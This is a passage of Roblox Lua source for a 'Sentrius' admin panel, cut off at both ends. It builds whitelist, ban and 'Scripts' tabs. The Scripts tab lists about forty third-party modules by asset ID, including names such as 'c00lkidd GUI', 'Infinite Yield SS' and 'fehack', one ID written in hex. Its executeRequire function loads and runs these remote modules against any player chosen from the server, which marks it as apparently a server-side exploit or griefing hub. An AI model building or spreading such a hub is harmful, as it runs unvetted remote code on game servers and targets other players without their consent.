        CommandLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
        CommandLabel.TextSize = 15
        CommandLabel.Font = Enum.Font.GothamBold
        CommandLabel.TextXAlignment = Enum.TextXAlignment.Left
        CommandLabel.Parent = CommandFrame
        
        local AliasText = "Aliases: None"
        if cmdData.aliases and #cmdData.aliases > 0 then
            AliasText = "Aliases: {" .. table.concat(cmdData.aliases, ", ") .. "}"
        end
        
        local CommandAlias = Instance.new("TextLabel")
        CommandAlias.Size = UDim2.new(0.5, -6, 0, 14)
        CommandAlias.Position = UDim2.new(0.5, 0, 0, 3)
        CommandAlias.BackgroundTransparency = 1
        CommandAlias.Text = AliasText
        CommandAlias.TextColor3 = Color3.fromRGB(180, 180, 180)
        CommandAlias.TextSize = 12
        CommandAlias.Font = Enum.Font.Gotham
        CommandAlias.TextXAlignment = Enum.TextXAlignment.Right
        CommandAlias.Parent = CommandFrame
        
        local DescLabel = Instance.new("TextLabel")
        DescLabel.Size = UDim2.new(1, -12, 0, 13)
        DescLabel.Position = UDim2.new(0, 6, 0, 20)
        DescLabel.BackgroundTransparency = 1
        DescLabel.Text = cmdData.desc
        DescLabel.TextColor3 = Color3.fromRGB(160, 160, 160)
        DescLabel.TextSize = 12
        DescLabel.Font = Enum.Font.Gotham
        DescLabel.TextXAlignment = Enum.TextXAlignment.Left
        DescLabel.Parent = CommandFrame
        
        local UsageLabel = Instance.new("TextLabel")
        UsageLabel.Size = UDim2.new(1, -12, 0, 11)
        UsageLabel.Position = UDim2.new(0, 6, 1, -13)
        UsageLabel.BackgroundTransparency = 1
        UsageLabel.Text = "Usage: " .. cmdData.usage
        UsageLabel.TextColor3 = Color3.fromRGB(120, 120, 120)
        UsageLabel.TextSize = 11
        UsageLabel.Font = Enum.Font.Gotham
        UsageLabel.TextXAlignment = Enum.TextXAlignment.Left
        UsageLabel.Parent = CommandFrame
    end
    
    commandsContent:FindFirstChild("Layout"):GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
        commandsContent.CanvasSize = UDim2.new(0, 0, 0, commandsContent.Layout.AbsoluteContentSize.Y + 10)
    end)
    commandsContent.CanvasSize = UDim2.new(0, 0, 0, commandsContent.Layout.AbsoluteContentSize.Y + 10)
    
    -- WHITELIST TAB CONTENT
    local whitelistContent = tabContents["Whitelist"]
    
    local function updateWhitelist()
        for _, child in ipairs(whitelistContent:GetChildren()) do
            if child:IsA("Frame") then
                child:Destroy()
            end
        end
        
        local counter = 1
        
        for userId, _ in pairs(whitelist) do
            local success, username = pcall(function()
                return Players:GetNameFromUserIdAsync(userId)
            end)
            
            if success and username then
                local WLFrame = Instance.new("Frame")
                WLFrame.Size = UDim2.new(1, -12, 0, 48)
                WLFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                WLFrame.BackgroundTransparency = 0.4
                WLFrame.BorderSizePixel = 1
                WLFrame.BorderColor3 = Color3.fromRGB(60, 60, 60)
                WLFrame.LayoutOrder = counter
                WLFrame.Parent = whitelistContent
                
                local WLCorner = Instance.new("UICorner")
                WLCorner.CornerRadius = UDim.new(0, 6)
                WLCorner.Parent = WLFrame
                
                local NameLabel = Instance.new("TextLabel")
                NameLabel.Size = UDim2.new(1, -110, 0, 17)
                NameLabel.Position = UDim2.new(0, 6, 0, 4)
                NameLabel.BackgroundTransparency = 1
                NameLabel.Text = counter .. " | " .. username
                NameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                NameLabel.TextSize = 14
                NameLabel.Font = Enum.Font.GothamBold
                NameLabel.TextXAlignment = Enum.TextXAlignment.Left
                NameLabel.Parent = WLFrame
                
                local TypeLabel = Instance.new("TextLabel")
                TypeLabel.Size = UDim2.new(0, 45, 0, 16)
                TypeLabel.Position = UDim2.new(1, -95, 0, 4)
                TypeLabel.BackgroundTransparency = 1
                TypeLabel.Text = "PERM"
                TypeLabel.TextColor3 = Color3.fromRGB(255, 215, 0)
                TypeLabel.TextSize = 11
                TypeLabel.Font = Enum.Font.GothamBold
                TypeLabel.Parent = WLFrame
                
                local RemoveButton = Instance.new("TextButton")
                RemoveButton.Size = UDim2.new(0, 38, 0, 24)
                RemoveButton.Position = UDim2.new(1, -43, 0, 2)
                RemoveButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
                RemoveButton.BackgroundTransparency = 0.3
                RemoveButton.BorderSizePixel = 1
                RemoveButton.BorderColor3 = Color3.fromRGB(80, 80, 80)
                RemoveButton.Text = "🔒"
                RemoveButton.TextColor3 = Color3.fromRGB(150, 150, 150)
                RemoveButton.TextSize = 15
                RemoveButton.Font = Enum.Font.GothamBold
                RemoveButton.Parent = WLFrame
                
                local RemoveCorner = Instance.new("UICorner")
                RemoveCorner.CornerRadius = UDim.new(0, 4)
                RemoveCorner.Parent = RemoveButton
                
                local IDLabel = Instance.new("TextLabel")
                IDLabel.Size = UDim2.new(1, -12, 0, 13)
                IDLabel.Position = UDim2.new(0, 6, 1, -18)
                IDLabel.BackgroundTransparency = 1
                IDLabel.Text = "ID: " .. userId
                IDLabel.TextColor3 = Color3.fromRGB(140, 140, 140)
                IDLabel.TextSize = 10
                IDLabel.Font = Enum.Font.Gotham
                IDLabel.TextXAlignment = Enum.TextXAlignment.Left
                IDLabel.Parent = WLFrame
                
                counter = counter + 1
            end
        end
        
        for userId, _ in pairs(tempwl) do
            local success, username = pcall(function()
                return Players:GetNameFromUserIdAsync(userId)
            end)
            
            if success and username then
                local WLFrame = Instance.new("Frame")
                WLFrame.Size = UDim2.new(1, -12, 0, 48)
                WLFrame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
                WLFrame.BackgroundTransparency = 0.4
                WLFrame.BorderSizePixel = 1
                WLFrame.BorderColor3 = Color3.fromRGB(60, 60, 60)
                WLFrame.LayoutOrder = counter
                WLFrame.Parent = whitelistContent
                
                local WLCorner = Instance.new("UICorner")
                WLCorner.CornerRadius = UDim.new(0, 6)
                WLCorner.Parent = WLFrame
                
                local NameLabel = Instance.new("TextLabel")
                NameLabel.Size = UDim2.new(1, -110, 0, 17)
                NameLabel.Position = UDim2.new(0, 6, 0, 4)
                NameLabel.BackgroundTransparency = 1
                NameLabel.Text = counter .. " | " .. username
                NameLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                NameLabel.TextSize = 14
                NameLabel.Font = Enum.Font.GothamBold
                NameLabel.TextXAlignment = Enum.TextXAlignment.Left
                NameLabel.Parent = WLFrame
                
                local TypeLabel = Instance.new("TextLabel")
                TypeLabel.Size = UDim2.new(0, 45, 0, 16)
                TypeLabel.Position = UDim2.new(1, -95, 0, 4)
                TypeLabel.BackgroundTransparency = 1
                TypeLabel.Text = "TEMP"
                TypeLabel.TextColor3 = Color3.fromRGB(100, 150, 255)
                TypeLabel.TextSize = 11
                TypeLabel.Font = Enum.Font.GothamBold
                TypeLabel.Parent = WLFrame
                
                local RemoveButton = Instance.new("TextButton")
                RemoveButton.Size = UDim2.new(0, 38, 0, 24)
                RemoveButton.Position = UDim2.new(1, -43, 0, 2)
                RemoveButton.BorderSizePixel = 1
                RemoveButton.Font = Enum.Font.GothamBold
                RemoveButton.Parent = WLFrame
                
                local RemoveCorner = Instance.new("UICorner")
                RemoveCorner.CornerRadius = UDim.new(0, 4)
                RemoveCorner.Parent = RemoveButton
                
                if owna(plr) then
                    RemoveButton.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
                    RemoveButton.BackgroundTransparency = 0.2
                    RemoveButton.BorderColor3 = Color3.fromRGB(220, 80, 80)
                    RemoveButton.Text = "X"
                    RemoveButton.TextColor3 = Color3.fromRGB(255, 255, 255)
                    RemoveButton.TextSize = 15
                    
                    RemoveButton.MouseButton1Click:Connect(function()
                        tempwl[userId] = nil
                        updateWhitelist()
                        
                        local targetPlayer = Players:GetPlayerByUserId(userId)
                        if targetPlayer then
                            notify(targetPlayer, "Sentrius", "You have been removed from the temporary whitelist!", 3)
                        end
                        
                        notify(plr, "Sentrius", username .. " has been removed from temp whitelist.", 3)
                    end)
                else
                    RemoveButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
                    RemoveButton.BackgroundTransparency = 0.3
                    RemoveButton.BorderColor3 = Color3.fromRGB(80, 80, 80)
                    RemoveButton.Text = "🔒"
                    RemoveButton.TextColor3 = Color3.fromRGB(150, 150, 150)
                    RemoveButton.TextSize = 15
                end
                
                local IDLabel = Instance.new("TextLabel")
                IDLabel.Size = UDim2.new(1, -12, 0, 13)
                IDLabel.Position = UDim2.new(0, 6, 1, -18)
                IDLabel.BackgroundTransparency = 1
                IDLabel.Text = "ID: " .. userId
                IDLabel.TextColor3 = Color3.fromRGB(140, 140, 140)
                IDLabel.TextSize = 10
                IDLabel.Font = Enum.Font.Gotham
                IDLabel.TextXAlignment = Enum.TextXAlignment.Left
                IDLabel.Parent = WLFrame
                
                counter = counter + 1
            end
        end
        
        task.wait(0.1)
        whitelistContent.CanvasSize = UDim2.new(0, 0, 0, whitelistContent.Layout.AbsoluteContentSize.Y + 10)
    end
    
    updateWhitelist()
    
    -- BANS TAB CONTENT
    local bansContent = tabContents["Bans"]
    
    local function updateBans()
    for _, child in ipairs(bansContent:GetChildren()) do
        if child:IsA("Frame") or child:IsA("TextLabel") then
            child:Destroy()
        end
    end
    
    local counter = 1
    
    for _, userId in ipairs(bannedIds) do
        local success, username = pcall(function()
            return Players:GetNameFromUserIdAsync(userId)
        end)
        
        if success and username then
            local BanFrame = Instance.new("Frame")
            BanFrame.Size = UDim2.new(1, -12, 0, 48)
            BanFrame.BackgroundColor3 = Color3.fromRGB(50, 30, 30)
            BanFrame.BackgroundTransparency = 0.3
            BanFrame.BorderSizePixel = 1
            BanFrame.BorderColor3 = Color3.fromRGB(100, 50, 50)
            BanFrame.LayoutOrder = counter
            BanFrame.Parent = bansContent
            
            local BanCorner = Instance.new("UICorner")
            BanCorner.CornerRadius = UDim.new(0, 6)
            BanCorner.Parent = BanFrame
            
            local NameLabel = Instance.new("TextLabel")
            NameLabel.Size = UDim2.new(1, -140, 0, 17)
            NameLabel.Position = UDim2.new(0, 6, 0, 4)
            NameLabel.BackgroundTransparency = 1
            NameLabel.Text = counter .. " | " .. username
            NameLabel.TextColor3 = Color3.fromRGB(255, 120, 120)
            NameLabel.TextSize = 14
            NameLabel.Font = Enum.Font.GothamBold
            NameLabel.TextXAlignment = Enum.TextXAlignment.Left
            NameLabel.Parent = BanFrame
            
            local BannedLabel = Instance.new("TextLabel")
            BannedLabel.Size = UDim2.new(0, 70, 0, 16)
            BannedLabel.Position = UDim2.new(1, -115, 0, 4)
            BannedLabel.BackgroundTransparency = 1
            BannedLabel.Text = "BANNED"
            BannedLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
            BannedLabel.TextSize = 11
            BannedLabel.Font = Enum.Font.GothamBold
            BannedLabel.Parent = BanFrame
            
            local UnbanButton = Instance.new("TextButton")
            UnbanButton.Size = UDim2.new(0, 38, 0, 24)
            UnbanButton.Position = UDim2.new(1, -43, 0, 2)
            UnbanButton.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
            UnbanButton.BackgroundTransparency = 0.2
            UnbanButton.BorderSizePixel = 1
            UnbanButton.BorderColor3 = Color3.fromRGB(120, 220, 120)
            UnbanButton.Text = "✓"
            UnbanButton.TextColor3 = Color3.fromRGB(255, 255, 255)
            UnbanButton.TextSize = 17
            UnbanButton.Font = Enum.Font.GothamBold
            UnbanButton.Parent = BanFrame
            
            local UnbanCorner = Instance.new("UICorner")
            UnbanCorner.CornerRadius = UDim.new(0, 4)
            UnbanCorner.Parent = UnbanButton
            
            UnbanButton.MouseButton1Click:Connect(function()
                local indexToRemove = table.find(bannedIds, userId)
                if indexToRemove then
                    table.remove(bannedIds, indexToRemove)
                end
                
                local banValue = banFolder:FindFirstChild(tostring(userId))
                if banValue then
                    banValue:Destroy()
                end
                
                updateBans()
                notify(plr, "Sentrius", username .. " has been unbanned!", 3)
            end)
            
            local IDLabel = Instance.new("TextLabel")
            IDLabel.Size = UDim2.new(1, -12, 0, 13)
            IDLabel.Position = UDim2.new(0, 6, 1, -18)
            IDLabel.BackgroundTransparency = 1
            IDLabel.Text = "ID: " .. userId
            IDLabel.TextColor3 = Color3.fromRGB(140, 140, 140)
            IDLabel.TextSize = 10
            IDLabel.Font = Enum.Font.Gotham
            IDLabel.TextXAlignment = Enum.TextXAlignment.Left
            IDLabel.Parent = BanFrame
            
            counter = counter + 1
        end
    end
    

    if counter == 1 then
        local NoBansLabel = Instance.new("TextLabel")
        NoBansLabel.Name = "NoBansLabel"
        NoBansLabel.Size = UDim2.new(1, 0, 0, 50)
        NoBansLabel.BackgroundTransparency = 1
        NoBansLabel.Text = "No banned players"
        NoBansLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
        NoBansLabel.TextSize = 15
        NoBansLabel.Font = Enum.Font.Gotham
        NoBansLabel.Parent = bansContent
    end
    
    task.wait(0.1)
    bansContent.CanvasSize = UDim2.new(0, 0, 0, bansContent.Layout.AbsoluteContentSize.Y + 10)
end
    
    updateBans()
    

    local lastBanCount = #bannedIds
    local banRefreshConnection = game:GetService("RunService").Heartbeat:Connect(function()
        if not ScreenGui.Parent then
            banRefreshConnection:Disconnect()
            return
        end
        
        task.wait(0.5)
        
        if #bannedIds ~= lastBanCount then
            lastBanCount = #bannedIds
            updateBans()
        end
    end)

-- skripts taps
local scriptsContent = tabContents["Scripts"]
local selectedTarget = plr

local requireScripts = {
    {
        name = "Determination Trident",
        id = 7409193749,
        func = function(module, target)
            module.load(target.Name)
        end,
        color = Color3.fromRGB(100, 150, 255),
        ownerOnly = false
    },
    {
        name = "Minecraft Steve",
        id = 15581949972,
        func = function(module, target)
            module.mc(target.Name)
        end,
        color = Color3.fromRGB(92, 65, 255),
        ownerOnly = false
    },
    {
        name = "Cadacus",
        id = 5686002742,
        func = function(module, target)
            module:Fire(target.Name, "caducus")
        end,
        color = Color3.fromRGB(255, 150, 100),
        ownerOnly = false
    },
    {
        name = "c00lkidd GUI",
        id = 14125553864,
        func = function(module, target)
            module:Fire(target.Name, "c00lkidd")
        end,
        color = Color3.fromRGB(255, 100, 100),
        ownerOnly = true
    },
    {
        name = "Super Mario",
        id = 86206606847204,
        func = function(module, target)
            module.SoRetro(target.Name)
        end,
        color = Color3.fromRGB(255, 50, 50),
        ownerOnly = false
    },
    {
        name = "Portal Tool",
        id = 15877665199,
        func = function(module, target)
            module.give(target.Name)
        end,
        color = Color3.fromRGB(100, 200, 255),
        ownerOnly = false
    },
    {
        name = "Whole Spacecraft",
        id = 9458671694,
        func = function(module, target)
            module.load(target.Name)
        end,
        color = Color3.fromRGB(150, 150, 255),
        ownerOnly = false
    },
    {
        name = "Crucifix",
        id = 12933040327,
        func = function(module, target)
            module(target.Name)
        end,
        color = Color3.fromRGB(255, 215, 0),
        ownerOnly = false
    },
    {
        name = "Lugiggity Gummies",
        id = 103037401805615,
        func = function(module, target)
            module.Luggigity(target.Name)
        end,
        color = Color3.fromRGB(255, 100, 255),
        ownerOnly = false
    },
    {
        name = "Santa Bot",
        id = 8039581168,
        func = function(module, target)
            module(target.Name, "Santa")
        end,
        color = Color3.fromRGB(255, 50, 50),
        ownerOnly = false
    },
    {
        name = "Polaria (Safer)",
        id = 88477009909590,
        func = function(module, target)
            module:Pload(target.Name)
        end,
        color = Color3.fromRGB(100, 200, 255),
        ownerOnly = true
    },
    {
        name = "Old Roblox",
        id = 83741719410595,
        func = function(module, target)
            module(true)
        end,
        color = Color3.fromRGB(200, 200, 200),
        ownerOnly = true
    },
    {
        name = "John Doe",
        id = 2845929020,
        func = function(module, target)
            module.ooga(target.Name)
        end,
        color = Color3.fromRGB(150, 150, 150),
        ownerOnly = false
    },
    {
        name = "a happyhub script that works",
        id = 135231466738957,
        func = function(module, target)
            module:Hload(target.Name)
        end,
        color = Color3.fromRGB(255, 180, 100),
        ownerOnly = true
    },
    {
        name = "Infinite Yield SS",
        id = 7634392335,
        func = function(module, target)
            module(target.Name)
        end,
        color = Color3.fromRGB(100, 150, 255),
        ownerOnly = true
    },
    {
        name = "Touhou Gun",
        id = 3990967806,
        func = function(module, target)
            module.load(target.Name)
        end,
        color = Color3.fromRGB(255, 120, 180),
        ownerOnly = false
    },
    {
        name = "Combat Tool",
        id = 15627085040,
        func = function(module, target)
            module.RAroblox(target.Name)
        end,
        color = Color3.fromRGB(255, 170, 80),
        ownerOnly = false
    },
    {
        name = "The Future (pc)",
        id = 7089500700,
        func = function(module, target)
            module.load(target.Name)
        end,
        color = Color3.fromRGB(120, 255, 200),
        ownerOnly = false
    },
    {
        name = "TSB Gojo",
        id = 14499140823,
        func = function(module, target)
            module(target.Name, "sorcerer")
        end,
        color = Color3.fromRGB(160, 120, 255),
        ownerOnly = false
    },
    {
        name = "Mafioso",
        id = 82428270854492,
        func = function(module, target)
            module.sigma(target.Name)
        end,
        color = Color3.fromRGB(90, 90, 90),
        ownerOnly = false
    },
    {
        name = "Bluudud something",
        id = 102814485459828,
        func = function(module, target)
            module.Forsaken(target.Name, "Bluudude")
        end,
        color = Color3.fromRGB(80, 140, 255),
        ownerOnly = false
    },
    {
        name = "DOGE ARMY",
        id = 5115249013,
        func = function(module, target)
            module.fehack(target.Name)
        end,
        color = Color3.fromRGB(255, 150, 100),
        ownerOnly = false
    },
    {
        name = "BMW 320SI Ravenwest",
        id = 135929402138610,
        func = function(module, target)
            module.BMW320SIRavenwestScrapped(target.Name)
        end,
        color = Color3.fromRGB(255, 200, 50),
        ownerOnly = false
    },
    {
        name = "Juggernaut",
        id = 7486656912,
        func = function(module, target)
            module.Juggernaut(target.Name)
        end,
        color = Color3.fromRGB(200, 100, 100),
        ownerOnly = false
    },
    {
        name = "idk tbh",
        id = 6727030812,
        func = function(module, target)
            module.Fun(target.Name, "Fun")
        end,
        color = Color3.fromRGB(255, 100, 255),
        ownerOnly = false
    },
    {
        name = "Alot of Guns",
        id = 7001260635,
        func = function(module, target)
            module.lctoolsreuploaded(target.Name)
        end,
        color = Color3.fromRGB(150, 150, 150),
        ownerOnly = false
    },
    {
        name = "Calamity",
        id = 3032735551,
        func = function(module, target)
            module:Start(target.Name, "AAA")
        end,
        color = Color3.fromRGB(255, 50, 50),
        ownerOnly = false
    },
    {
        name = "Grab Gun",
        id = 5146659840,
        func = function(module, target)
            module.Dark_Eccentric("Dark_Eccentric", target.Name)
        end,
        color = Color3.fromRGB(100, 100, 200),
        ownerOnly = false
    },
    {
        name = "Felipe",
        id = 5605396200,
        func = function(module, target)
            module:load(target.Name, "Felipe")
        end,
        color = Color3.fromRGB(255, 180, 100),
        ownerOnly = false
    },
    {
        name = "Stick Beater",
        id = 5813743814,
        func = function(module, target)
            module.load(target.Name)
        end,
        color = Color3.fromRGB(150, 100, 50),
        ownerOnly = false
    },
    {
        name = "Shadow Kars",
        id = 6058159336,
        func = function(module, target)
            module.load(target.Name)
        end,
        color = Color3.fromRGB(50, 50, 50),
        ownerOnly = false
    },
    {
        name = "The Defiant",
        id = 6168743245,
        func = function(module, target)
            module.load(target.Name)
        end,
        color = Color3.fromRGB(100, 200, 255),
        ownerOnly = false
    },
    {
        name = "Nectula Corrupted Demon",
        id = 3224070083,
        func = function(module, target)
            module.load(target.Name)
        end,
        color = Color3.fromRGB(150, 0, 200),
        ownerOnly = false
    },
    {
        name = "Xester V2",
        id = 6099241563,
        func = function(module, target)
            module.load(target.Name)
        end,
        color = Color3.fromRGB(255, 255, 100),
        ownerOnly = false
    },
    {
        name = "Phantom Forces Guns",
        id = 0xA8526D5D,
        func = function(module, target)
            module.giveGuns(target.Name)
        end,
        color = Color3.fromRGB(200, 200, 200),
        ownerOnly = false
    },
    {
        name = "Viankos",
        id = 6123029966,
        func = function(module, target)
            module.vian(target.Name)
        end,
        color = Color3.fromRGB(100, 255, 200),
        ownerOnly = false
    },
    {
        name = "Roz Hub",
        id = 5702333343,
        func = function(module, target)
            module.load(target.Name)
        end,
        color = Color3.fromRGB(255, 150, 200),
        ownerOnly = false
    },
    {
        name = "Dodgeball",
        id = 4722391208,
        func = function(module, target)
            module.load(target.Name)
        end,
        color = Color3.fromRGB(255, 100, 150),
        ownerOnly = false
    },
    {
        name = "Random Stuff",
        id = 10286545277,
        func = function(module, target)
            module.RandomStuff(target.Name)
        end,
        color = Color3.fromRGB(255, 50, 150),
        ownerOnly = false
    },
}

local TargetSelectorFrame = Instance.new("Frame")
TargetSelectorFrame.Name = "TargetSelector"
TargetSelectorFrame.Size = UDim2.new(1, -12, 0, 70)
TargetSelectorFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
TargetSelectorFrame.BackgroundTransparency = 0.3
TargetSelectorFrame.BorderSizePixel = 1
TargetSelectorFrame.BorderColor3 = Color3.fromRGB(80, 80, 80)
TargetSelectorFrame.LayoutOrder = 0
TargetSelectorFrame.Parent = scriptsContent

local SelectorCorner = Instance.new("UICorner")
SelectorCorner.CornerRadius = UDim.new(0, 8)
SelectorCorner.Parent = TargetSelectorFrame

local SelectorTitle = Instance.new("TextLabel")
SelectorTitle.Size = UDim2.new(1, -12, 0, 18)
SelectorTitle.Position = UDim2.new(0, 6, 0, 4)
SelectorTitle.BackgroundTransparency = 1
SelectorTitle.Text = "goog someone to goog any goog on the goog:"
SelectorTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
SelectorTitle.TextSize = 14
SelectorTitle.Font = Enum.Font.GothamBold
SelectorTitle.TextXAlignment = Enum.TextXAlignment.Left
SelectorTitle.Parent = TargetSelectorFrame


local DropdownButton = Instance.new("TextButton")
DropdownButton.Name = "DropdownButton"
DropdownButton.Size = UDim2.new(1, -12, 0, 40)
DropdownButton.Position = UDim2.new(0, 6, 0, 25)
DropdownButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
DropdownButton.BackgroundTransparency = 0.2
DropdownButton.BorderSizePixel = 1
DropdownButton.BorderColor3 = Color3.fromRGB(100, 150, 255)
DropdownButton.Text = ""
DropdownButton.Parent = TargetSelectorFrame

local DropdownCorner = Instance.new("UICorner")
DropdownCorner.CornerRadius = UDim.new(0, 6)
DropdownCorner.Parent = DropdownButton

local DropdownAvatar = Instance.new("ImageLabel")
DropdownAvatar.Size = UDim2.new(0, 32, 0, 32)
DropdownAvatar.Position = UDim2.new(0, 4, 0, 4)
DropdownAvatar.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
DropdownAvatar.BorderSizePixel = 0
DropdownAvatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=48&height=48&format=png"
DropdownAvatar.Parent = DropdownButton

local DropdownAvatarCorner = Instance.new("UICorner")
DropdownAvatarCorner.CornerRadius = UDim.new(0, 4)
DropdownAvatarCorner.Parent = DropdownAvatar


local DropdownLabel = Instance.new("TextLabel")
DropdownLabel.Size = UDim2.new(1, -75, 1, 0)
DropdownLabel.Position = UDim2.new(0, 42, 0, 0)
DropdownLabel.BackgroundTransparency = 1
DropdownLabel.Text = plr.DisplayName .. " (Me)"
DropdownLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
DropdownLabel.TextSize = 14
DropdownLabel.Font = Enum.Font.GothamBold
DropdownLabel.TextXAlignment = Enum.TextXAlignment.Left
DropdownLabel.Parent = DropdownButton

local DropdownArrow = Instance.new("TextLabel")
DropdownArrow.Size = UDim2.new(0, 30, 1, 0)
DropdownArrow.Position = UDim2.new(1, -30, 0, 0)
DropdownArrow.BackgroundTransparency = 1
DropdownArrow.Text = "⬇️"
DropdownArrow.TextColor3 = Color3.fromRGB(100, 150, 255)
DropdownArrow.TextSize = 12
DropdownArrow.Font = Enum.Font.GothamBold
DropdownArrow.Parent = DropdownButton

local DropdownList = Instance.new("ScrollingFrame")
DropdownList.Name = "DropdownList"
DropdownList.Size = UDim2.new(1, -12, 0, 200)
DropdownList.Position = UDim2.new(0, 6, 0, 68)
DropdownList.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
DropdownList.BackgroundTransparency = 0.05
DropdownList.BorderSizePixel = 1
DropdownList.BorderColor3 = Color3.fromRGB(100, 150, 255)
DropdownList.ScrollBarThickness = 4
DropdownList.ScrollBarImageColor3 = Color3.fromRGB(100, 150, 255)
DropdownList.Visible = false
DropdownList.ZIndex = 10
DropdownList.Parent = TargetSelectorFrame

local DropdownListCorner = Instance.new("UICorner")
DropdownListCorner.CornerRadius = UDim.new(0, 6)
DropdownListCorner.Parent = DropdownList

local DropdownLayout = Instance.new("UIListLayout")
DropdownLayout.Parent = DropdownList
DropdownLayout.SortOrder = Enum.SortOrder.LayoutOrder
DropdownLayout.Padding = UDim.new(0, 2)

local function updateDropdownList()
    for _, child in ipairs(DropdownList:GetChildren()) do
        if child:IsA("TextButton") then
            child:Destroy()
        end
    end
    

    for _, p in ipairs(Players:GetPlayers()) do
        local PlayerButton = Instance.new("TextButton")
        PlayerButton.Name = "Player_" .. p.UserId
        PlayerButton.Size = UDim2.new(1, -8, 0, 42)
        PlayerButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
        PlayerButton.BackgroundTransparency = p == selectedTarget and 0.1 or 0.4
        PlayerButton.BorderSizePixel = 0
        PlayerButton.Text = ""
        PlayerButton.ZIndex = 11
        PlayerButton.Parent = DropdownList
        
        local PlayerButtonCorner = Instance.new("UICorner")
        PlayerButtonCorner.CornerRadius = UDim.new(0, 4)
        PlayerButtonCorner.Parent = PlayerButton
        
        local PlayerAvatar = Instance.new("ImageLabel")
        PlayerAvatar.Size = UDim2.new(0, 34, 0, 34)
        PlayerAvatar.Position = UDim2.new(0, 4, 0, 4)
        PlayerAvatar.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        PlayerAvatar.BorderSizePixel = 0
        PlayerAvatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. p.UserId .. "&width=48&height=48&format=png"
        PlayerAvatar.ZIndex = 12
        PlayerAvatar.Parent = PlayerButton
        
        local PlayerAvatarCorner = Instance.new("UICorner")
        PlayerAvatarCorner.CornerRadius = UDim.new(0, 4)
        PlayerAvatarCorner.Parent = PlayerAvatar
        
        local PlayerLabel = Instance.new("TextLabel")
        PlayerLabel.Size = UDim2.new(1, -75, 0, 18)
        PlayerLabel.Position = UDim2.new(0, 42, 0, 4)
        PlayerLabel.BackgroundTransparency = 1
        PlayerLabel.Text = p.DisplayName .. (p == plr and " (Me)" or "")
        PlayerLabel.TextColor3 = p == selectedTarget and Color3.fromRGB(100, 200, 255) or Color3.fromRGB(255, 255, 255)
        PlayerLabel.TextSize = 13
        PlayerLabel.Font = Enum.Font.GothamBold
        PlayerLabel.TextXAlignment = Enum.TextXAlignment.Left
        PlayerLabel.ZIndex = 12
        PlayerLabel.Parent = PlayerButton
        
        local UsernameLabel = Instance.new("TextLabel")
        UsernameLabel.Size = UDim2.new(1, -75, 0, 14)
        UsernameLabel.Position = UDim2.new(0, 42, 0, 22)
        UsernameLabel.BackgroundTransparency = 1
        UsernameLabel.Text = "@" .. p.Name
        UsernameLabel.TextColor3 = Color3.fromRGB(170, 170, 170)
        UsernameLabel.TextSize = 10
        UsernameLabel.Font = Enum.Font.Gotham
        UsernameLabel.TextXAlignment = Enum.TextXAlignment.Left
        UsernameLabel.ZIndex = 12
        UsernameLabel.Parent = PlayerButton
        
        if p == selectedTarget then
            local Checkmark = Instance.new("TextLabel")
            Checkmark.Size = UDim2.new(0, 20, 0, 20)
            Checkmark.Position = UDim2.new(1, -24, 0.5, -10)
            Checkmark.BackgroundTransparency = 1
            Checkmark.Text = "✅"
            Checkmark.TextColor3 = Color3.fromRGB(100, 255, 100)
            Checkmark.TextSize = 16
            Checkmark.Font = Enum.Font.GothamBold
            Checkmark.ZIndex = 12
            Checkmark.Parent = PlayerButton
        end
        

        PlayerButton.MouseButton1Click:Connect(function()
            selectedTarget = p
            

            DropdownAvatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. p.UserId .. "&width=48&height=48&format=png"
            DropdownLabel.Text = p.DisplayName .. (p == plr and " (Me)" or "")
            

            DropdownList.Visible = false
            DropdownArrow.Text = "⬇️"
            

            updateDropdownList()
        end)
        
        PlayerButton.MouseEnter:Connect(function()
            if p ~= selectedTarget then
                TweenService:Create(PlayerButton, TweenInfo.new(0.2), {
                    BackgroundTransparency = 0.2
                }):Play()
            end
        end)
        
        PlayerButton.MouseLeave:Connect(function()
            if p ~= selectedTarget then
                TweenService:Create(PlayerButton, TweenInfo.new(0.2), {
                    BackgroundTransparency = 0.4
                }):Play()
            end
        end)
    end
    
    task.wait(0.05)
    DropdownList.CanvasSize = UDim2.new(0, 0, 0, DropdownLayout.AbsoluteContentSize.Y + 8)
end

local dropdownOpen = false
DropdownButton.MouseButton1Click:Connect(function()
    dropdownOpen = not dropdownOpen
    DropdownList.Visible = dropdownOpen
    DropdownArrow.Text = dropdownOpen and "⬆️" or "⬇️"
    
    if dropdownOpen then
        updateDropdownList()
    end
end)

local playerListUpdateConnection = Players.PlayerAdded:Connect(function(p)
    if dropdownOpen then
        updateDropdownList()
    end
end)

local playerListUpdateConnection2 = Players.PlayerRemoving:Connect(function(p)
    if p == selectedTarget then
        selectedTarget = plr
        DropdownAvatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=48&height=48&format=png"
        DropdownLabel.Text = plr.DisplayName .. " (Me)"
    end
    
    if dropdownOpen then
        updateDropdownList()
    end
end)

local function executeRequire(scriptData)
    if scriptData.ownerOnly and not owna(plr) then
        notify(plr, "Sentrius", "This script is restricted to owners only!", 3)
        return
    end
    
    local target = selectedTarget or plr
    
    if not target.Character then
        notify(plr, "Sentrius", target.DisplayName .. " has no character loaded!", 3)
        return
    end
    
    local success1, module = pcall(function()
        return require(scriptData.id)
    end)
    
    if not success1 then
